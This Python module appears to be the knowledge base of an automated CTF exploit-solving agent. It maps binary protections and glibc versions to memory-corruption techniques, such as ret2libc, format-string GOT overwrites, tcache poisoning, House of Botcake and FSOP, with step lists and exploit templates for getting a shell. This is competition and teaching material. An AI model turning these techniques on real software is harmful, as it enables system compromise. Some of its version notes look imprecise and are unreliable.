"""
Knowledge Base for PWN Solver.

Static rules and technique guides:
- CHECKSEC_TECHNIQUES: protection combo → exploitation strategy
- HEAP_TECHNIQUES: glibc version → available heap techniques
- Lookup functions for Plan/Exploit agents
"""

from typing import Any, Dict, List, Optional, Tuple


# =============================================================================
# Checksec → Exploitation Strategy Mapping
# =============================================================================

CHECKSEC_TECHNIQUES: Dict[str, Dict[str, Any]] = {
    # -------------------------------------------------------------------------
    # Stack-based: No Canary
    # -------------------------------------------------------------------------
    "bof_no_canary_no_pie_nx": {
        "name": "ret2libc (Classic)",
        "conditions": {"canary": False, "pie": False, "nx": True},
        "strategy": "ret2libc",
        "description": "Buffer overflow → leak libc via PLT/GOT → call system('/bin/sh')",
        "steps": [
            "1. Find buffer size and calculate offset to RIP (buf_size + 8)",
            "2. Find 'pop rdi; ret' gadget with ROPgadget",
            "3. Leak libc address: overflow → pop_rdi, puts_got → puts_plt → main",
            "4. Calculate libc base from leaked address",
            "5. Stage 2: overflow → ret (alignment) → pop_rdi, bin_sh → system",
        ],
        "required_info": ["offset", "pop_rdi_gadget", "puts_plt", "puts_got", "main_addr"],
        "template_key": "ret2libc",
    },
    "bof_no_canary_no_pie_no_nx": {
        "name": "Shellcode Injection",
        "conditions": {"canary": False, "pie": False, "nx": False},
        "strategy": "shellcode",
        "description": "Buffer overflow → inject shellcode → jump to it",
        "steps": [
            "1. Find buffer size and calculate offset to RIP",
            "2. Find buffer address (stack or BSS)",
            "3. Write shellcode + padding + return to shellcode",
        ],
        "required_info": ["offset", "buf_addr_or_leak"],
        "template_key": "shellcode",
    },
    "bof_canary_no_pie_nx": {
        "name": "Canary Leak + ret2libc",
        "conditions": {"canary": True, "pie": False, "nx": True},
        "strategy": "canary_leak_ret2libc",
        "description": "Leak canary (via format string / brute force) → overflow with canary → ret2libc",
        "steps": [
            "1. Find canary leak primitive (format string, partial overwrite, etc.)",
            "2. Leak canary value",
            "3. Overflow: padding + canary + saved_rbp + ROP chain",
            "4. ROP chain: leak libc → system('/bin/sh')",
        ],
        "required_info": ["offset", "canary_leak_method", "pop_rdi_gadget"],
        "prerequisite": "Need a separate info leak for canary (format string, etc.)",
        "template_key": "canary_ret2libc",
    },
    "bof_no_canary_pie_nx": {
        "name": "PIE Leak + ret2libc",
        "conditions": {"canary": False, "pie": True, "nx": True},
        "strategy": "pie_leak_ret2libc",
        "description": "Leak binary base → resolve addresses → ret2libc",
        "steps": [
            "1. Find PIE base leak (format string, partial overwrite, etc.)",
            "2. Calculate binary base from leaked address",
            "3. Use resolved PLT/GOT addresses for libc leak",
            "4. ret2libc with correct addresses",
        ],
        "required_info": ["offset", "pie_leak_method"],
        "prerequisite": "Need info leak for binary base address",
        "template_key": "pie_ret2libc",
    },
    "bof_canary_pie_nx": {
        "name": "Full Protection Bypass",
        "conditions": {"canary": True, "pie": True, "nx": True},
        "strategy": "full_bypass",
        "description": "Leak canary + PIE base + libc → ROP",
        "steps": [
            "1. Find multiple leak primitives",
            "2. Leak canary, PIE base, and optionally libc address",
            "3. Construct ROP chain with resolved addresses",
        ],
        "required_info": ["canary_leak", "pie_leak", "offset"],
        "prerequisite": "Requires powerful leak primitive (usually format string)",
        "template_key": "full_bypass",
    },

    # -------------------------------------------------------------------------
    # Format String
    # -------------------------------------------------------------------------
    "fmt_partial_relro": {
        "name": "Format String GOT Overwrite",
        "conditions": {"vuln_type": "format_string", "relro": "partial"},
        "strategy": "fmt_got_overwrite",
        "description": "Use format string to overwrite GOT entry → redirect to one_gadget or system",
        "steps": [
            "1. Find format string offset (%N$p until input appears)",
            "2. Leak libc address via %s on GOT entry",
            "3. Calculate one_gadget or system address",
            "4. Overwrite GOT entry with fmtstr_payload()",
        ],
        "required_info": ["fmt_offset", "got_entry", "libc_base"],
        "template_key": "fmt_got",
    },
    "fmt_full_relro": {
        "name": "Format String Stack Return Overwrite",
        "conditions": {"vuln_type": "format_string", "relro": "full"},
        "strategy": "fmt_stack_overwrite",
        "description": "GOT is read-only → overwrite return address on stack via format string",
        "steps": [
            "1. Find format string offset",
            "2. Leak stack address to find return address location",
            "3. Overwrite return address with one_gadget or ROP chain",
        ],
        "required_info": ["fmt_offset", "stack_leak", "libc_base"],
        "template_key": "fmt_stack",
    },

    # -------------------------------------------------------------------------
    # RELRO-specific
    # -------------------------------------------------------------------------
    "full_relro_rop": {
        "name": "Pure ROP (Full RELRO)",
        "conditions": {"relro": "full", "nx": True},
        "strategy": "pure_rop",
        "description": "GOT is read-only → cannot overwrite GOT. Use pure ROP or one_gadget.",
        "alternatives": [
            "Pure ROP chain: execve('/bin/sh', NULL, NULL)",
            "one_gadget (if constraints met)",
            "FSOP / _IO_FILE exploitation (advanced)",
        ],
        "template_key": "full_relro_rop",
    },
}


# =============================================================================
# Heap Techniques by glibc Version
# =============================================================================

HEAP_TECHNIQUES: Dict[str, Dict[str, Any]] = {
    # -------------------------------------------------------------------------
    # Tcache-based (glibc >= 2.26)
    # -------------------------------------------------------------------------
    "tcache_poisoning": {
        "name": "Tcache Poisoning",
        "glibc_range": (2.26, None),  # 2.26+, still works with modifications
        "description": "Corrupt tcache fd pointer to return arbitrary address from malloc",
        "primitive_needed": ["uaf", "heap_overflow", "double_free"],
        "notes": {
            "2.26-2.28": "Direct fd overwrite (no protections)",
            "2.29-2.31": "tcache key field added → need to clear key or use different approach",
            "2.32+": "Safe linking: fd = target ^ (chunk_addr >> 12). Requires heap leak.",
        },
        "modern_template": """
# Tcache poisoning (glibc >= 2.32, safe linking)
# Requires: heap_leak (for safe linking bypass), target_addr
heap_base = leak_heap_addr()
target = libc.sym['environ']  # or any target

# Free chunk to tcache
free(chunk_idx)

# Overwrite fd with mangled pointer
mangled_fd = target ^ (heap_base >> 12)
edit(chunk_idx, p64(mangled_fd))

# Allocate twice: first returns freed chunk, second returns target
alloc(size, b'A')
alloc(size, payload)  # → writes to target
""",
    },
    "tcache_dup": {
        "name": "Tcache Dup (Double Free via UAF Key Bypass)",
        "glibc_range": (2.27, 2.33),  # 2.27+ has key check, 2.34 removes hooks
        "description": (
            "glibc 2.27+ added a 'key' field in tcache chunks to prevent double free. "
            "If you have UAF (edit-after-free), overwrite the key field to bypass this check, "
            "then free again → same chunk enters tcache twice → tcache poisoning. "
            "Different from simple tcache_poisoning which only edits fd."
        ),
        "primitive_needed": ["uaf"],
        "steps": [
            "1. Allocate chunk A (tcache-sized, e.g. 0x30)",
            "2. Free chunk A → enters tcache, key field set to tcache_perthread_struct addr",
            "3. UAF Edit: write 8 bytes padding + b'\\x00' to overwrite the key field (offset +0x8)",
            "4. Free chunk A again → double free succeeds (key check bypassed)",
            "5. Now tcache has: A → A (circular). Alloc returns A, write target address as fd",
            "6. Alloc again returns A, alloc once more returns target address",
        ],
        "notes": {
            "2.27-2.28": "Key is tcache_perthread_struct pointer. Overwrite with anything != that value.",
            "2.29-2.31": "Key is random value (tcache_key). Still bypassable via UAF edit.",
            "2.32+": "Safe linking added. Need heap leak to mangle fd pointer.",
        },
        "modern_template": """
# Tcache Dup (glibc 2.27-2.31, UAF key bypass)
# Requires: UAF (edit-after-free on freed chunk)

# Step 1: Alloc and free to put in tcache
alloc(0x30, b'AAAA')
free()

# Step 2: UAF edit to overwrite tcache key (at chunk+0x8)
# 8 bytes of fd + overwrite key with \\x00 to bypass double-free check
edit(b'B' * 0x8 + b'\\x00')

# Step 3: Double free (key is no longer valid → passes check)
free()

# Step 4: Tcache is now: chunk → chunk (circular)
# First alloc: returns chunk, we write target address as new fd
alloc(0x30, p64(target_addr))

# Step 5: Second alloc returns chunk again (consuming one entry)
alloc(0x30, b'dummy')

# Step 6: Third alloc returns target_addr
alloc(0x30, payload)  # writes payload to target_addr
""",
    },
    "house_of_botcake": {
        "name": "House of Botcake",
        "glibc_range": (2.26, None),
        "description": "Bypass tcache double-free restriction via unsorted bin consolidation",
        "primitive_needed": ["double_free"],
        "steps": [
            "1. Fill tcache (7 chunks)",
            "2. Free victim → goes to unsorted bin",
            "3. Free prev chunk → consolidates with victim in unsorted bin",
            "4. Take one from tcache, then double-free victim (now in both tcache and unsorted)",
            "5. Allocate large chunk from unsorted → overlaps victim",
            "6. Overwrite victim's fd in tcache → tcache poisoning",
        ],
        "modern_template": """
# House of Botcake (glibc >= 2.26)
# Fill tcache
for i in range(7):
    alloc(0x100)
prev = alloc(0x100)    # prev chunk
victim = alloc(0x100)  # victim chunk
guard = alloc(0x10)    # prevent top consolidation

# Fill tcache
for i in range(7):
    free(i)

# victim → unsorted bin
free(victim)
# prev consolidates with victim
free(prev)

# Take one from tcache, double-free victim into tcache
alloc(0x100)
free(victim)  # now in both tcache and consolidated unsorted chunk

# Overlapping allocation from unsorted
big = alloc(0x100 + 0x100 + 0x10)
# Overwrite victim's fd via big chunk → tcache poisoning
""",
    },
    "tcache_stashing_unlink": {
        "name": "Tcache Stashing Unlink Attack",
        "glibc_range": (2.26, None),
        "description": "Abuse calloc (bypasses tcache) + smallbin → tcache stashing for arbitrary write",
        "primitive_needed": ["uaf", "heap_overflow"],
        "notes": "calloc() does not serve from tcache, goes to smallbin directly",
    },
    "house_of_water": {
        "name": "House of Water",
        "glibc_range": (2.26, None),
        "description": "Leakless tcache metadata control via UAF or double-free",
        "primitive_needed": ["uaf", "double_free"],
    },
    "tcache_metadata_poisoning": {
        "name": "Tcache Metadata Poisoning",
        "glibc_range": (2.26, None),
        "description": "Directly corrupt tcache_perthread_struct for arbitrary pointer",
        "primitive_needed": ["heap_overflow", "arbitrary_write"],
    },

    # -------------------------------------------------------------------------
    # Unsorted / Large Bin
    # -------------------------------------------------------------------------
    "large_bin_attack": {
        "name": "Large Bin Attack (Post-2.30)",
        "glibc_range": (2.30, None),
        "description": "Write heap address to arbitrary location via large bin insertion",
        "primitive_needed": ["uaf", "heap_overflow"],
        "notes": {
            "pre_2.30": "Traditional large bin attack (modify bk/bk_nextsize)",
            "post_2.30": "Two new checks added, but bk_nextsize path still works when new chunk is smallest",
        },
        "modern_template": """
# Large bin attack (post glibc 2.30)
# Write heap_addr to target via bk_nextsize manipulation
p1 = alloc(0x428)  # large chunk
guard1 = alloc(0x18)
p2 = alloc(0x418)  # slightly smaller, same large bin
guard2 = alloc(0x18)

free(p1)
alloc(0x438)  # insert p1 into large bin

free(p2)  # p2 in unsorted bin

# Corrupt p1->bk_nextsize to (target - 0x20)
edit(p1_idx, payload_with_bk_nextsize=p64(target - 0x20))

alloc(0x438)  # triggers insertion of p2, overwrites target
""",
    },
    "unsorted_bin_attack": {
        "name": "Unsorted Bin Attack",
        "glibc_range": (2.23, 2.28),  # Patched in 2.29
        "description": "Write main_arena address to arbitrary location (OBSOLETE in >= 2.29)",
        "primitive_needed": ["uaf", "heap_overflow"],
        "notes": "Patched: unsorted bin bk is now checked",
    },

    # -------------------------------------------------------------------------
    # Libc Leak Techniques (Heap-based)
    # -------------------------------------------------------------------------
    "stdout_bss_leak": {
        "name": "stdout/stdin BSS Partial Overwrite Leak",
        "glibc_range": (2.23, None),
        "description": (
            "When unsorted bin leak is impossible (e.g., single chunk pointer → no guard chunk "
            "→ freed chunk consolidates with top chunk), use tcache poisoning to allocate at "
            "the BSS stdout/stdin pointer. Then partial-overwrite the LSB to redirect it to "
            "_IO_2_1_stdout_ in libc. The Print function then leaks the libc address. "
            "Works because ASLR randomizes upper bytes but the LSB offset within a page is fixed."
        ),
        "primitive_needed": ["uaf", "tcache_dup"],
        "when_to_use": [
            "Program has only ONE chunk pointer variable (single alloc/free target)",
            "Unsorted bin leak fails due to top chunk consolidation (no guard chunk possible)",
            "Binary has No PIE → BSS addresses of stdout/stdin are known",
            "Binary has a 'print chunk content' feature",
        ],
        "steps": [
            "1. Use tcache dup to get arbitrary allocation at stdout BSS address (e.g., e.symbols['stdout'])",
            "2. Allocate at stdout BSS → partial overwrite LSB with _IO_2_1_stdout_ offset byte",
            "   (Only 1 byte needs to be correct since ASLR doesn't affect page offset)",
            "3. Use the Print function → binary does printf/puts using the now-redirected stdout",
            "4. Receive 6 bytes → u64() → this is the _IO_2_1_stdout_ address in libc",
            "5. libc_base = leaked_addr - libc.sym['_IO_2_1_stdout_']",
        ],
        "notes": {
            "no_pie": "BSS addresses (stdout, stdin) are fixed. e.symbols['stdout'] gives the address.",
            "pie": "Need a separate PIE leak first to know the BSS address.",
        },
        "modern_template": """
# stdout BSS Partial Overwrite Leak
# Requires: No PIE, tcache dup, print feature
# Use when: single pointer → can't do unsorted bin leak

e = ELF('./binary')
stdout_bss = e.symbols['stdout']  # BSS address storing stdout pointer

# Step 1: Tcache dup to get allocation at stdout BSS
alloc(0x30, b'A')
free()
edit(b'B' * 0x8 + b'\\x00')  # overwrite tcache key
free()  # double free

# Write stdout BSS as tcache fd
alloc(0x30, p64(stdout_bss))
alloc(0x30, b'dummy')

# Step 2: Allocate at stdout BSS, partial overwrite LSB
# _IO_2_1_stdout_ LSB from libc (check with: p64(libc.sym['_IO_2_1_stdout_'])[0:1])
io_stdout_lsb = p64(libc.sym['_IO_2_1_stdout_'])[0:1]
alloc(0x30, io_stdout_lsb)

# Step 3: Print → leaks _IO_2_1_stdout_ address
print_chunk()
leaked = u64(recv(6) + b'\\x00' * 2)
libc_base = leaked - libc.sym['_IO_2_1_stdout_']
""",
    },
    "unsorted_bin_leak": {
        "name": "Unsorted Bin Libc Leak",
        "glibc_range": (2.23, None),
        "description": (
            "Free a chunk larger than tcache max (request > 0x408 for glibc 2.26+) "
            "with a guard chunk allocated AFTER it to prevent top chunk consolidation. "
            "The fd/bk of the freed chunk points to main_arena+96 → libc leak."
        ),
        "primitive_needed": ["uaf", "multiple_chunk_ptrs"],
        "when_to_use": [
            "Program has MULTIPLE chunk pointer variables (can keep guard chunk alive)",
            "Or can allocate a large-enough chunk that bypasses tcache",
        ],
        "steps": [
            "1. Allocate large chunk (> 0x408 request) → bypasses tcache",
            "2. Allocate guard chunk AFTER it (prevents top chunk consolidation)",
            "3. Free large chunk → enters unsorted bin → fd = main_arena + 96",
            "4. Read freed chunk content via UAF/print → leak fd",
            "5. libc_base = leaked - (libc.sym['__malloc_hook'] + 0x10 + 96)",
        ],
        "critical_note": (
            "WILL FAIL without guard chunk! If only 1 chunk pointer exists, "
            "the freed chunk consolidates with top chunk and fd/bk are NOT set. "
            "Use stdout_bss_leak instead for single-pointer programs."
        ),
        "modern_template": """
# Unsorted bin leak (REQUIRES guard chunk)
# IMPORTANT: Need at least 2 chunk pointers, or allocate guard before freeing

alloc(idx=0, size=0x420, content=b'A' * 8)  # large chunk (bypasses tcache)
alloc(idx=1, size=0x20, content=b'guard')    # guard chunk (prevents top consolidation)
free(idx=0)  # → unsorted bin, fd = main_arena + 96

# UAF read to leak fd
leaked = u64(read_chunk(idx=0)[:6].ljust(8, b'\\x00'))
libc_base = leaked - (libc.sym['__malloc_hook'] + 0x10 + 96)
""",
    },

    # -------------------------------------------------------------------------
    # Consolidation-based
    # -------------------------------------------------------------------------
    "house_of_einherjar": {
        "name": "House of Einherjar",
        "glibc_range": (2.23, None),
        "description": "Off-by-one null byte → fake prev_size → backward consolidation to fake chunk",
        "primitive_needed": ["off_by_one_null"],
        "steps": [
            "1. Create fake chunk with valid fd/bk (point to itself for unlink)",
            "2. Allocate victim chunk after fake chunk",
            "3. Off-by-one null into victim's prev_inuse bit",
            "4. Set fake prev_size to point back to fake chunk",
            "5. Free victim → consolidates backward to fake chunk",
            "6. Overlapping allocation → control freed chunks",
        ],
    },
    "poison_null_byte": {
        "name": "Poison Null Byte",
        "glibc_range": (2.23, None),
        "description": "Single null byte overflow → shrink chunk size → overlapping chunks",
        "primitive_needed": ["off_by_one_null"],
    },
    "unsafe_unlink": {
        "name": "Unsafe Unlink",
        "glibc_range": (2.23, None),
        "description": "Corrupt chunk metadata → unlink macro writes to known pointer location",
        "primitive_needed": ["heap_overflow"],
        "notes": "Requires known pointer to chunk (global array). P->fd->bk == P && P->bk->fd == P check.",
    },
    "overlapping_chunks": {
        "name": "Overlapping Chunks",
        "glibc_range": (2.23, 2.28),  # Size check added in 2.29
        "description": "Modify freed chunk size for overlapping allocation (OBSOLETE in >= 2.29)",
        "primitive_needed": ["heap_overflow"],
    },

    # -------------------------------------------------------------------------
    # Top Chunk / Wilderness
    # -------------------------------------------------------------------------
    "house_of_force": {
        "name": "House of Force",
        "glibc_range": (2.23, 2.28),  # Patched in 2.29
        "description": "Overwrite top chunk size → allocate to arbitrary address (OBSOLETE in >= 2.29)",
        "primitive_needed": ["heap_overflow"],
    },
    "house_of_orange": {
        "name": "House of Orange",
        "glibc_range": (2.23, 2.25),  # Requires _IO_list_all, no tcache
        "description": "Abuse top chunk + _IO_FILE for code execution without free",
        "primitive_needed": ["heap_overflow"],
        "notes": "Classic FSOP technique. Obsolete in tcache era but concept lives on.",
    },
    "house_of_tangerine": {
        "name": "House of Tangerine",
        "glibc_range": (2.26, None),
        "description": "Modern top chunk abuse with tcache for arbitrary pointer return",
        "primitive_needed": ["heap_overflow"],
    },

    # -------------------------------------------------------------------------
    # Fastbin-based
    # -------------------------------------------------------------------------
    "fastbin_dup": {
        "name": "Fastbin Dup",
        "glibc_range": (2.23, None),  # Still works but tcache preferred
        "description": "Double free in fastbin for arbitrary pointer return",
        "primitive_needed": ["double_free"],
        "notes": "In tcache era (2.26+), tcache is checked first. Need to fill tcache or use fastbin directly.",
    },
    "house_of_spirit": {
        "name": "House of Spirit",
        "glibc_range": (2.23, None),
        "description": "Free a fake chunk to get it into freelist → allocate it back",
        "primitive_needed": ["arbitrary_free"],
    },

    # -------------------------------------------------------------------------
    # Modern IO-based (glibc >= 2.34, no hooks)
    # -------------------------------------------------------------------------
    "house_of_apple": {
        "name": "House of Apple (FSOP)",
        "glibc_range": (2.34, None),
        "description": "File Stream Oriented Programming via _IO_FILE vtable hijack",
        "primitive_needed": ["large_bin_attack", "uaf"],
        "notes": (
            "glibc >= 2.34 removed __free_hook/__malloc_hook. "
            "Modern targets: _IO_list_all, _IO_FILE vtable, exit_funcs, TLS-dtor_list. "
            "Typically chained: large_bin_attack to write _IO_list_all → craft fake _IO_FILE."
        ),
        "modern_template": """
# House of Apple 2 (FSOP, glibc >= 2.34)
# Step 1: Large bin attack to overwrite _IO_list_all
# Step 2: Forge fake _IO_FILE_plus struct
# Step 3: Trigger via exit() or return from main

# Fake _IO_FILE targeting _IO_wfile_overflow
fake_io = flat({
    0x0:  0,                      # _flags
    0x20: 0,                      # _IO_write_base
    0x28: 1,                      # _IO_write_ptr (must > _IO_write_base)
    0x68: system_addr,            # __doallocate or target func
    0x88: heap_addr,              # _lock (must be writable & zero)
    0xa0: fake_wide_data_addr,    # _wide_data
    0xd8: _IO_wfile_jumps_addr,   # vtable → _IO_wfile_overflow
})
""",
    },
}


# =============================================================================
# Heap Exploit Decision Guide (Constraint-based Selection)
# =============================================================================

HEAP_CONSTRAINT_GUIDE = {
    "description": (
        "Decision tree for selecting the correct heap exploitation technique. "
        "The key factor is the binary's STRUCTURAL CONSTRAINTS, not just the vulnerability type."
    ),
    "step1_identify_primitives": {
        "description": "What heap operations does the binary allow?",
        "checks": [
            "Alloc: Can you allocate chunks? Any size restriction?",
            "Free: Can you free chunks? Does it NULL the pointer? (NULL → no UAF)",
            "Edit: Can you edit AFTER free? (Yes → UAF write primitive)",
            "Print: Can you read AFTER free? (Yes → UAF read primitive / leak)",
            "How many chunk pointers? Single variable vs array of pointers",
        ],
    },
    "step2_pointer_structure": {
        "description": "How many simultaneous live chunks can exist?",
        "single_pointer": {
            "constraint": "Only ONE chunk pointer variable (e.g., void *chunk)",
            "implications": [
                "Cannot keep guard chunk alive → unsorted bin leak FAILS (top consolidation)",
                "Cannot fill tcache (need 7 frees of same size, but only 1 pointer)",
                "Must use tcache dup (UAF key bypass) for double free",
                "Libc leak via stdout/stdin BSS partial overwrite (not unsorted bin)",
            ],
            "recommended_flow": [
                "1. Tcache dup → allocate at stdout BSS → partial overwrite → libc leak",
                "2. Tcache dup again → allocate at __free_hook → overwrite with one_gadget (PREFERRED) or system",
                "3. Trigger: free any chunk → one_gadget executes. If one_gadget fails, use system('/bin/sh')",
            ],
        },
        "array_pointer": {
            "constraint": "Array of chunk pointers (e.g., chunks[16])",
            "implications": [
                "Can keep guard chunk → unsorted bin leak works",
                "Can fill tcache (7 frees) → force chunks into fastbin/unsorted bin",
                "More flexibility in technique selection",
            ],
            "recommended_flow": [
                "1. Unsorted bin leak: alloc large + guard, free large, read fd → libc",
                "2. Tcache poisoning: free chunk, UAF edit fd → __free_hook",
                "3. Overwrite __free_hook with one_gadget (PREFERRED) or system. Trigger: free chunk → shell",
            ],
        },
    },
    "step3_libc_leak_selection": {
        "description": "Which libc leak technique to use?",
        "decision_tree": {
            "multiple_pointers + can_alloc_large": "Unsorted bin leak (safest, most reliable)",
            "single_pointer + no_pie + has_print": "stdout BSS partial overwrite",
            "single_pointer + pie + has_print": "Need PIE leak first, then stdout BSS",
            "has_format_string": "Direct libc leak via %p/%s on GOT",
            "can_read_got + partial_relro": "Read GOT entry to leak libc function address",
        },
    },
    "step4_write_target_selection": {
        "description": "Where to write for code execution? (PREFER one_gadget over system — simpler, one address)",
        "decision_tree": {
            "glibc_lt_2.34 + has_free": "__free_hook → one_gadget (PREFERRED, try all offsets), fallback system('/bin/sh')",
            "glibc_lt_2.34 + has_malloc": "__malloc_hook → one_gadget (must satisfy constraints)",
            "glibc_lt_2.34 + partial_relro": "GOT overwrite (simplest)",
            "glibc_ge_2.34": "FSOP (_IO_list_all), exit_funcs, TLS dtor_list",
        },
    },
}


# =============================================================================
# Hook Availability by glibc Version
# =============================================================================

HOOK_AVAILABILITY = {
    "2.23": {"__malloc_hook": True, "__free_hook": True, "__realloc_hook": True},
    "2.27": {"__malloc_hook": True, "__free_hook": True, "__realloc_hook": True},
    "2.31": {"__malloc_hook": True, "__free_hook": True, "__realloc_hook": True},
    "2.33": {"__malloc_hook": True, "__free_hook": True, "__realloc_hook": True},
    "2.34": {"__malloc_hook": False, "__free_hook": False, "__realloc_hook": False},
    "2.35": {"__malloc_hook": False, "__free_hook": False, "__realloc_hook": False},
    "2.37": {"__malloc_hook": False, "__free_hook": False, "__realloc_hook": False},
    "2.39": {"__malloc_hook": False, "__free_hook": False, "__realloc_hook": False},
}

MODERN_TARGETS = {
    "name": "Modern Targets (No Hooks)",
    "description": "Post glibc 2.34 exploitation targets (no malloc/free hooks)",
    "targets": [
        {"name": "_IO_list_all / FSOP", "method": "Forge fake _IO_FILE, overwrite vtable"},
        {"name": "exit_funcs / __exit_funcs", "method": "Overwrite exit handler list"},
        {"name": "TLS dtor_list", "method": "Overwrite TLS destructor list"},
        {"name": "GOT overwrite", "method": "If Partial RELRO, overwrite libc GOT entries"},
        {"name": "Stack pivot", "method": "Overwrite saved RBP/RSP via arbitrary write"},
    ],
}


# =============================================================================
# Lookup Functions
# =============================================================================

def get_checksec_guide(checksec: Dict[str, Any]) -> Dict[str, Any]:
    """
    Given checksec results, recommend exploitation strategy.

    Args:
        checksec: dict with keys: nx, canary, pie, relro (from deterministic parser)

    Returns:
        Dict with strategy name, description, steps, required_info
    """
    nx = checksec.get("nx", False)
    canary = checksec.get("canary", False)
    pie = checksec.get("pie", False)
    relro = str(checksec.get("relro", "none")).lower()

    results = {
        "recommended": [],
        "relro_note": "",
        "hooks_available": relro != "full",
    }

    # RELRO note
    if relro == "full":
        results["relro_note"] = "Full RELRO: GOT is read-only. Cannot overwrite GOT entries."
    elif relro == "partial":
        results["relro_note"] = "Partial RELRO: GOT is writable. GOT overwrite possible."

    # Stack-based strategies
    if not canary and not pie and nx:
        results["recommended"].append(CHECKSEC_TECHNIQUES["bof_no_canary_no_pie_nx"])
    elif not canary and not pie and not nx:
        results["recommended"].append(CHECKSEC_TECHNIQUES["bof_no_canary_no_pie_no_nx"])
    elif canary and not pie and nx:
        results["recommended"].append(CHECKSEC_TECHNIQUES["bof_canary_no_pie_nx"])
    elif not canary and pie and nx:
        results["recommended"].append(CHECKSEC_TECHNIQUES["bof_no_canary_pie_nx"])
    elif canary and pie and nx:
        results["recommended"].append(CHECKSEC_TECHNIQUES["bof_canary_pie_nx"])

    # Format string is always worth mentioning if applicable
    if relro != "full":
        results["recommended"].append(CHECKSEC_TECHNIQUES["fmt_partial_relro"])
    else:
        results["recommended"].append(CHECKSEC_TECHNIQUES["fmt_full_relro"])

    # Full RELRO note
    if relro == "full":
        results["recommended"].append(CHECKSEC_TECHNIQUES["full_relro_rop"])

    return results


def get_heap_techniques(glibc_version: str) -> List[Dict[str, Any]]:
    """
    Given glibc version, return available heap exploitation techniques.

    Args:
        glibc_version: e.g. "2.35", "2.31", "2.27"

    Returns:
        List of applicable technique dicts
    """
    try:
        ver = float(glibc_version)
    except (ValueError, TypeError):
        ver = 2.35  # default to modern

    applicable = []
    for key, tech in HEAP_TECHNIQUES.items():
        min_ver, max_ver = tech.get("glibc_range", (2.23, None))
        if min_ver is not None and ver < min_ver:
            continue
        if max_ver is not None and ver > max_ver:
            continue
        applicable.append({
            "key": key,
            **tech,
            "version_notes": _get_version_notes(tech, ver),
        })

    # Add hook availability info
    hooks_available = ver < 2.34
    for t in applicable:
        t["hooks_available"] = hooks_available

    if not hooks_available:
        applicable.append({
            "key": "modern_targets",
            **MODERN_TARGETS,
            "hooks_available": False,
            "version_notes": "glibc >= 2.34: __free_hook/__malloc_hook removed. Use FSOP, exit_funcs, or TLS.",
        })

    return applicable


def get_heap_constraint_guide(
    pointer_type: str = "unknown",
    has_uaf: bool = False,
    has_print: bool = False,
    pie: bool = False,
    glibc_version: str = "2.35",
) -> Dict[str, Any]:
    """
    Get heap exploitation strategy based on binary constraints.

    Args:
        pointer_type: "single" or "array" or "unknown"
        has_uaf: Whether UAF (edit/read after free) exists
        has_print: Whether freed chunk content can be read
        pie: Whether PIE is enabled
        glibc_version: glibc version string

    Returns:
        Dict with recommended leak method, write target, and full flow
    """
    try:
        ver = float(glibc_version)
    except (ValueError, TypeError):
        ver = 2.35

    hooks_available = ver < 2.34
    result = {
        "pointer_type": pointer_type,
        "recommended_leak": "",
        "recommended_write_target": "",
        "recommended_flow": [],
        "warnings": [],
    }

    # Leak method selection
    if pointer_type == "single":
        result["warnings"].append(
            "Single pointer: unsorted bin leak WILL FAIL (no guard chunk → top consolidation)"
        )
        if not pie and has_print:
            result["recommended_leak"] = "stdout_bss_partial_overwrite"
            result["recommended_flow"].append(
                "Leak: tcache dup → alloc at stdout BSS → partial overwrite LSB → libc leak"
            )
        elif pie and has_print:
            result["recommended_leak"] = "pie_leak_then_stdout"
            result["recommended_flow"].append("Leak: need PIE leak first, then stdout BSS")
        else:
            result["recommended_leak"] = "unknown"
            result["warnings"].append("No clear leak method for single-pointer without print")
    else:
        result["recommended_leak"] = "unsorted_bin_leak"
        result["recommended_flow"].append(
            "Leak: alloc large chunk + guard chunk, free large → unsorted bin fd leak"
        )

    # Write target selection
    if hooks_available:
        result["recommended_write_target"] = "__free_hook → one_gadget (preferred)"
        result["recommended_flow"].append(
            "Write: tcache poison/dup → alloc at __free_hook → overwrite with one_gadget (PREFERRED)"
        )
    else:
        result["recommended_write_target"] = "FSOP_or_exit_funcs"
        result["recommended_flow"].append(
            "Write: FSOP via _IO_list_all or exit_funcs (no hooks in glibc >= 2.34)"
        )

    # Trigger
    if hooks_available and "__free_hook" in result["recommended_write_target"]:
        result["recommended_flow"].append(
            "Trigger: free any chunk → one_gadget executes. If constraints fail, retry with system('/bin/sh')"
        )

    return result


def get_technique_guide(technique_name: str) -> Optional[Dict[str, Any]]:
    """
    Get detailed guide for a specific technique.

    Args:
        technique_name: e.g. "tcache_poisoning", "house_of_botcake"

    Returns:
        Technique dict or None
    """
    # Check heap techniques
    if technique_name in HEAP_TECHNIQUES:
        return HEAP_TECHNIQUES[technique_name]

    # Check checksec techniques
    if technique_name in CHECKSEC_TECHNIQUES:
        return CHECKSEC_TECHNIQUES[technique_name]

    # Fuzzy match
    name_lower = technique_name.lower().replace(" ", "_").replace("-", "_")
    for key, tech in {**HEAP_TECHNIQUES, **CHECKSEC_TECHNIQUES}.items():
        if name_lower in key or key in name_lower:
            return tech

    return None


def _get_version_notes(tech: Dict[str, Any], ver: float) -> str:
    """Get version-specific notes for a technique."""
    notes = tech.get("notes", {})
    if isinstance(notes, str):
        return notes
    if isinstance(notes, dict):
        best_match = ""
        for version_key, note in notes.items():
            try:
                # "2.32+" format
                if version_key.endswith("+"):
                    base = float(version_key.rstrip("+"))
                    if ver >= base:
                        best_match = note
                # "2.26-2.28" range format
                elif "-" in version_key and version_key[0].isdigit():
                    parts = version_key.split("-")
                    low, high = float(parts[0]), float(parts[1])
                    if low <= ver <= high:
                        best_match = note
                # "pre_2.30", "post_2.30" format
                elif version_key.startswith("pre_"):
                    threshold = float(version_key.replace("pre_", ""))
                    if ver < threshold:
                        best_match = note
                elif version_key.startswith("post_"):
                    threshold = float(version_key.replace("post_", ""))
                    if ver >= threshold:
                        best_match = note
                # Plain version "2.32"
                else:
                    base = float(version_key)
                    if ver >= base:
                        best_match = note
            except (ValueError, IndexError):
                continue
        return best_match
    return ""
